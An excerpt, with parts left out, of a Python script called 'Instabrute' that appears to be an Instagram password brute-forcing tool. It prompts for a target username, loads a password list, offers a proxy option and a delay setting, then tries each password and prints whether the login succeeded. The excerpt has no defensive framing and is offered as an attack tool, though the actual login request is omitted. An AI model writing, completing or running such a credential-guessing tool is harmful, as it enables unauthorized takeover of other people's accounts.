...
class Instabrute():
	def __init__(self, username, passwordsFile='password.txt'):
		...
		UsePorxy = Input('\033[1;32m[*] Do you want to use proxy (y/n):\033[1;33m ').upper()
		...
		if os.path.isfile(self.passwordsFile):
			with open(self.passwordsFile) as f:
				...
				if (passwordsNumber > 0):
					print ('\033[1;32m[*]\033[1;33m %s \033[1;32mPasswords loads successfully' % passwordsNumber)
				else:
...
instabrute = Instabrute(Input('\033[1;32m [?] Username :\033[1;33m '))

try:
	delayLoop = int(Input('\033[1;32m[*] Delay (in seconds) :\033[1;33m ')) 
except Exception as e:
	print ('\033[1;31m[*] Error, software use the defult value "4"')
	delayLoop = 4
print ('')
...
for password in instabrute.passwords:
	...
	if sess:
		print (' \033[1;32m[*] Login success\033[1;33m %s' % [instabrute.username,password])
	else:
		print ('\033[1;37m[*] Password incorrect \033[1;31m[%s]' % password)
